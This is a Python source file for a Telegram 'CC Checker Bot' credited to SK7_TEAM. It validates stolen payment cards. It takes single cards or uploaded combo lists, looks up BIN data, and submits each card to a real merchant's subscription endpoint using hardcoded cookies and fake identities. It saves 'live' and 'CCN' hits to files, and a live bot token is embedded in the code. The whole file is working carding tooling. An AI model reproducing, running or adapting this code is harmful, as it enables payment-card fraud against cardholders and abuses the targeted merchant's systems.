import os
import random
import string
import telebot
import requests
from telebot import types
import re
import pycountry

token = "6855261959:AAHrNBFRxLPPfY5NwGBpzezI9zMZ74Hym8A"
bot = telebot.TeleBot(token)

# Define global variables
results_message_id = None
results = {'Good': 0, 'Bad': 0, 'Custom': 0}
is_checking = False  # Variable to control the checking process

@bot.message_handler(commands=["start"])
def start(message):
    phot = "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg676x3BxQFzwApw2M6nAwuCrxdWBUCOWtWvJYr9k3mqxodMMYxy1AWWo_glEiFVft6pykO_kxFq1XSb5CYrM9_h_HztOy9j3iOXPlZU8aWzz4zbEnCg61ug3NKqIir4fGLI1rGJDM-wW8/s1600-rw/480538.png"
    get_nams = f"t.me/{message.from_user.username}"
    tag = f'<a href="{get_nams}">{message.from_user.first_name}</a>'
    text = f"Hello {tag}, Welcome to the CC Checker Bot!"
    L7Nbut1 = types.InlineKeyboardMarkup()
    L7N1 = types.InlineKeyboardButton(text="📋Check Combo📋", callback_data="check_combo")
    L7N1_single_card = types.InlineKeyboardButton(text="💳Check Single Card💳", callback_data="check_single_card")
    programmer_channel_button = types.InlineKeyboardButton(text="⚙️Programmer Channel⚙️", url="t.me/SK7_TEAM")
    L7Nbut1.add(L7N1)
    L7Nbut1.add(L7N1_single_card)
    L7Nbut1.add(programmer_channel_button)
    bot.send_photo(message.chat.id, phot, caption=text, parse_mode="HTML", reply_markup=L7Nbut1)

def update_results_message(chat_id):
    L7Nbut2 = types.InlineKeyboardMarkup()
    L7Nbut2.add(types.InlineKeyboardButton(text=f"🟢Good: {results['Good']}", callback_data="L7N1_god"))
    L7Nbut2.add(types.InlineKeyboardButton(text=f"🟡Custom: {results['Custom']}", callback_data="L7N1_custom"))
    L7Nbut2.add(types.InlineKeyboardButton(text=f"🔴Bad: {results['Bad']}", callback_data="L7N1_bad"))
    L7Nbut2.add(types.InlineKeyboardButton(text="❗️ Stop Combo Check ❗️", callback_data="stop_combo"))
    L7Nbut2.add(types.InlineKeyboardButton(text="📢 Programmer Channel 📢", url="t.me/SK7_TEAM"))
    bot.edit_message_reply_markup(chat_id, message_id=results_message_id, reply_markup=L7Nbut2)

def generate_random_email():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"

def extract_bin_info(bin_number):
    url = "https://bins.su"
    payload = f"action=searchbins&bins={bin_number}&bank=&country="
    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; ART-L29N; HMSCore 6.13.0.321) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.5.303 Mobile Safari/537.36",
        'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        'Content-Type': "application/x-www-form-urlencoded",
        'Cache-Control': "max-age=0",
        'sec-ch-ua': "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"HuaweiBrowser\";v=\"99\"",
        'sec-ch-ua-mobile': "?1",
        'sec-ch-ua-platform': "\"Android\"",
        'Upgrade-Insecure-Requests': "1",
        'origin': "https://bins.su",
        'Sec-Fetch-Site': "same-origin",
        'Sec-Fetch-Mode': "navigate",
        'Sec-Fetch-User': "?1",
        'Sec-Fetch-Dest': "document",
        'Referer': "https://bins.su/",
        'Accept-Language': "ar-YE,ar;q=0.9,en-YE;q=0.8,en-US;q=0.7,en;q=0.6",
    }
    api = requests.post(url, data=payload, headers=headers)
    res = re.search(r'<div id="result">(.+?)</div>', api.text, re.DOTALL)
    if res:
        bins = re.findall(r'<tr><td>(\d+)</td><td>([A-Z]{2})</td><td>(\w+)</td><td>(\w+)</td><td>(\w+)</td><td>(.+?)</td></tr>', res.group(1))
        if bins:
            bin_number, country_code, vendor, card_type, level, bank = bins[0]
        else:
            bin_number, country_code, vendor, card_type, level, bank = "", "", "", "", "", ""
    else:
        bin_number, country_code, vendor, card_type, level, bank = "", "", "", "", "", ""
    if len(country_code) == 2 and country_code.isalpha():
        country_code = country_code.upper()
        flag_offset = 127397
        flag = ''.join(chr(ord(char) + flag_offset) for char in country_code)
    else:
        flag = ""
    try:
        country = pycountry.countries.get(alpha_2=country_code)
        country_name = country.name if country else ""
    except:
        country_name = ""

    return f'''𝓑𝓘𝓝: {bin_number}\n𝓒𝓸𝓾𝓷𝓽𝓻𝔂: {country_name} {flag}\n𝓣𝓨𝓟𝓔: {vendor}-{card_type}-{level}\n𝓑𝓐𝓝𝓚: {bank}'''


def check_combo(line, start_num, message):
    global is_checking
    if not is_checking:
        return

    try:
        cc, mes, ano, cvv = line.strip().split('|')
        if len(ano) > 2:
            ano = ano[-2:]
    except ValueError:
        bot.send_message(message.chat.id, f"⛔️Incorrect format: {line.strip()}\n❗️Please use the format: cc|mm|yy|cvv")
        return

    bin_number = cc[:6]
    bin_info = extract_bin_info(bin_number)

    cookies = {
        'ci_session': 'q02e5mg690hmi2sjlpj1oa9l498cmrhu',
        '_gcl_au': '1.1.2029250302.1716667211',
        '_ga': 'GA1.1.1399344079.1716667211',
        'optiMonkClientId': '0f2a32aa-18ab-a5f4-25d1-ee9a3ee46a5f',
        '_ga_4HXMJ7D3T6': 'GS1.1.1716667211.1.1.1716667424.0.0.0',
        '_ga_KQ5ZJRZGQR': 'GS1.1.1716667211.1.1.1716667424.0.0.0',
    }
    headers = {
        'authority': 'www.lagreeod.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.lagreeod.com',
        'referer': 'https://www.lagreeod.com/subscribe',
        'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    email = generate_random_email()

    data = {
        'stripe_customer': '',
        'subscription_type': 'Monthly Subscription',
        'firstname': 'Afwbdo',
        'lastname': 'Alwafi',
        'email': email,
        'password': 'gvghhawfwa6tghf',
        'card[name]': 'trh',
        'card[number]': cc,
        'card[exp_month]': mes,
        'card[exp_year]': ano,
        'card[cvc]': cvv,
        'coupon': '',
        's1': '8',
        'sum': '25',
    }

    response = requests.post('https://www.lagreeod.com/register/validate_subscribe', cookies=cookies, headers=headers,
                             data=data)
    response_json = response.json()
    msg = response_json.get('message')

    if msg:
        if "card has insufficient funds" in msg:
            results['Good'] += 1
            bot.send_message(message.chat.id,
                             f'𝓐𝓟𝓟𝓡𝓞𝓥𝓔𝓓 ✅\n𝑪𝑨𝑹𝑫  ➜ {line.strip()}\n𝑹𝑬𝑺𝑼𝑳𝑻 ➜ Low Balance + Live CVV 🟢\n━━━━━━━𝗜𝗡𝗙𝗢━━━━━━━\n{bin_info}\n━━━━━━━𝗜𝗡𝗙𝗢━━━━━━━\n𝑩𝒀 =》 @SK7_TEAM\n')
            chit = f'''𝓐𝓟𝓟𝓡𝓞𝓥𝓔𝓓 ✅\n𝑪𝑨𝑹𝑫  ➜ {line.strip()}\n𝑹𝑬𝑺𝑼𝑳𝑻 ➜ Low Balance + Live CVV 🟢\n━━━━━━━𝗜𝗡𝗙𝗢━━━━━━━\n{bin_info}\n━━━━━━━𝗜𝗡𝗙𝗢━━━━━━━\n𝑩𝒀 =》 @SK7_TEAM\n'''
            print(chit)
            with open('''visaHIT.txt''', '''a''') as ff:
                ff.write(f'''{chit}\n''')
        elif "security code is incorrect" in msg:
            results['Custom'] += 1
            bot.send_message(message.chat.id,
                             f'𝓐𝓟𝓟𝓡𝓞𝓥𝓔𝓓 ✅\n𝑪𝑨𝑹𝑫  ➜ {line.strip()}\n𝑹𝑬𝑺𝑼𝑳𝑻 ➜ CCN 🟡\n━━━━━━━𝗜𝗡𝗙𝗢━━━━━━━\n{bin_info}\n━━━━━━━𝗜𝗡𝗙𝗢━━━━━━━\n𝑩𝒀 =》 @SK7_TEAM\n')
            dhit = f'''𝓐𝓟𝓟𝓡𝓞𝓥𝓔𝓓 ✅\n𝑪𝑨𝑹𝑫  ➜ {line.strip()}\n𝑹𝑬𝑺𝑼𝑳𝑻 ➜ CCN 🟡\n━━━━━━━𝗜𝗡𝗙𝗢━━━━━━━\n{bin_info}\n━━━━━━━𝗜𝗡𝗙𝗢━━━━━━━\n𝑩𝒀 =》 @SK7_TEAM\n'''
            print(dhit)
            with open('''visaCCN.txt''', '''a''') as ff:
                ff.write(f'''{dhit}\n''')
        else:
            results['Bad'] += 1
            print(f'''𝓓𝓔𝓒𝓛𝓘𝓝𝓔𝓓 ❌\n𝑪𝑨𝑹𝑫  ➜ {line.strip()}\n𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 𝓓𝓔𝓒𝓛𝓘𝓝𝓔𝓓 🔴\n''')

        update_results_message(message.chat.id)

def check_single_card(card_info, message):
    try:
        cc, mes, ano, cvv = card_info.strip().split('|')
        if len(ano) > 2:
            ano = ano[-2:]
    except ValueError:
        bot.send_message(message.chat.id, f"️⛔️Incorrect format: {card_info.strip()}\n ❗️Please use the format cc|mm|yy|cvv")
        return

    bin_number = cc[:6]
    bin_info = extract_bin_info(bin_number)

    cookies = {
        'ci_session': 'q02e5mg690hmi2sjlpj1oa9l498cmrhu',
        '_gcl_au': '1.1.2029250302.1716667211',
        '_ga': 'GA1.1.1399344079.1716667211',
        'optiMonkClientId': '0f2a32aa-18ab-a5f4-25d1-ee9a3ee46a5f',
        '_ga_4HXMJ7D3T6': 'GS1.1.1716667211.1.1.1716667424.0.0.0',
        '_ga_KQ5ZJRZGQR': 'GS1.1.1716667211.1.1.1716667424.0.0.0',
    }
    headers = {
        'authority': 'www.lagreeod.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.lagreeod.com',
        'referer': 'https://www.lagreeod.com/subscribe',
        'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    email = generate_random_email()

    data = {
        'stripe_customer': '',
        'subscription_type': 'Monthly Subscription',
        'firstname': 'Afwbdo',
        'lastname': 'Alwafi',
        'email': email,
        'password': 'gvghhawfwa6tghf',
        'card[name]': 'trh',
        'card[number]': cc,
        'card[exp_month]': mes,
        'card[exp_year]': ano,
        'card[cvc]': cvv,
        'coupon': '',
        's1': '8',
        'sum': '25',
    }

    response = requests.post('https://www.lagreeod.com/register/validate_subscribe', cookies=cookies, headers=headers, data=data)
    response_json = response.json()
    msg = response_json.get('message')

    if msg:
        if "card has insufficient funds" in msg:
            results['Good'] += 1
            bot.send_message(message.chat.id,
                             f'𝓐𝓟𝓟𝓡𝓞𝓥𝓔𝓓 ✅\n𝑪𝑨𝑹𝑫  ➜ {card_info.strip()}\n𝑹𝑬𝑺𝑼𝑳𝑻 ➜ Low Balance + Live CVV 🟢\n━━━━━━━𝗜𝗡𝗙𝗢━━━━━━━\n{bin_info}\n━━━━━━━𝗜𝗡𝗙𝗢━━━━━━━\n𝑩𝒀 =》 @SK7_TEAM\n')
            ahit = f'''𝓐𝓟𝓟𝓡𝓞𝓥𝓔𝓓 ✅\n𝑪𝑨𝑹𝑫  ➜ {card_info.strip()}\n𝑹𝑬𝑺𝑼𝑳𝑻 ➜ Low Balance + Live CVV 🟢\n━━━━━━━𝗜𝗡𝗙𝗢━━━━━━━\n{bin_info}\n━━━━━━━𝗜𝗡𝗙𝗢━━━━━━━\n𝑩𝒀 =》 @SK7_TEAM\n'''
            print(ahit)
            with open('''visaHIT.txt''', '''a''') as ff:
                ff.write(f'''{ahit}\n''')
        elif "security code is incorrect" in msg:
            results['Custom'] += 1
            bot.send_message(message.chat.id,
                             f'𝓐𝓟𝓟𝓡𝓞𝓥𝓔𝓓 ✅\n𝑪𝑨𝑹𝑫  ➜ {card_info.strip()}\n𝑹𝑬𝑺𝑼𝑳𝑻 ➜ CCN 🟡\n━━━━━━━𝗜𝗡𝗙𝗢━━━━━━━\n{bin_info}\n━━━━━━━𝗜𝗡𝗙𝗢━━━━━━━\n𝑩𝒀 =》 @SK7_TEAM\n')
            zhit = f'''𝓐𝓟𝓟𝓡𝓞𝓥𝓔𝓓 ✅\n𝑪𝑨𝑹𝑫  ➜ {card_info.strip()}\n𝑹𝑬𝑺𝑼𝑳𝑻 ➜ CCN 🟡\n━━━━━━━𝗜𝗡𝗙𝗢━━━━━━━\n{bin_info}\n━━━━━━━𝗜𝗡𝗙𝗢━━━━━━━\n𝑩𝒀 =》 @SK7_TEAM\n'''
            print(zhit)
            with open('''visaCCN.txt''', '''a''') as ff:
                ff.write(f'''{zhit}\n''')
        else:
            results['Bad'] += 1
            bot.send_message(message.chat.id, f'''𝓓𝓔𝓒𝓛𝓘𝓝𝓔𝓓 ❌\n𝑪𝑨𝑹𝑫  ➜ {card_info.strip()}\n𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 𝓓𝓔𝓒𝓛𝓘𝓝𝓔𝓓 🔴\n━━━━━━━𝗜𝗡𝗙𝗢━━━━━━━\n{bin_info}\n━━━━━━━𝗜𝗡𝗙𝗢━━━━━━━\n𝑩𝒀 =》 @SK7_TEAM\n''')
            print(f'''𝓓𝓔𝓒𝓛𝓘𝓝𝓔𝓓 ❌\n𝑪𝑨𝑹𝑫  ➜ {card_info.strip()}\n𝑹𝑬𝑺𝑼𝑳𝑻 ➜ 𝓓𝓔𝓒𝓛𝓘𝓝𝓔𝓓 🔴\n''')

        update_results_message(message.chat.id)

def handle_combo_check(message):
    global is_checking
    if is_checking:
        bot.send_message(message.chat.id, "⛔️Please wait until the current combo check is completed❗️")
        return

    L7Nbut2 = types.InlineKeyboardMarkup()
    L7Nbut2.add(types.InlineKeyboardButton(text="❗️Stop Combo Check❗️", callback_data="stop_combo"))
    bot.send_message(message.chat.id, "♻️Please send the COMBO File (.txt) :", reply_markup=L7Nbut2)

    is_checking = True

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "check_combo":
        handle_combo_check(call.message)
    elif call.data == "check_single_card":
        bot.send_message(call.message.chat.id, "⚠️Please send the card info in this format: cc|mm|yy|cvv")
    elif call.data == "L7N1_god":
        bot.send_message(call.message.chat.id, f"🟢Good: {results['Good']}")
    elif call.data == "L7N1_custom":
        bot.send_message(call.message.chat.id, f"🟡Custom: {results['Custom']}")
    elif call.data == "L7N1_bad":
        bot.send_message(call.message.chat.id, f"🔴Bad: {results['Bad']}")
    elif call.data == "stop_combo":
        global is_checking
        is_checking = False
        bot.send_message(call.message.chat.id, "❗️Combo check stopped❗ to BACK to menu: /start")
    elif call.data == "main_menu":
        start(call.message)
    elif call.data == "view_current_card":
        update_results_message(call.message.chat.id)

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    global results_message_id
    results_message = bot.send_message(message.chat.id, "♻️Uploading the COMBO Wait...")
    results_message_id = results_message.message_id

    global is_checking
    is_checking = True

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)

    src = os.path.join(os.getcwd(), message.document.file_name)
    with open(message.document.file_name, 'wb') as new_file:
        new_file.write(downloaded_file)

    with open(message.document.file_name, 'r') as combo_file:
        for line in combo_file:
            if not is_checking:
                break
            check_combo(line, message.from_user.id, message)

    os.remove(message.document.file_name)

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    if is_checking:
        bot.send_message(message.chat.id, "⛔️Please wait until the current combo check is completed❗️")
    else:
        check_single_card(message.text, message)

bot.polling()
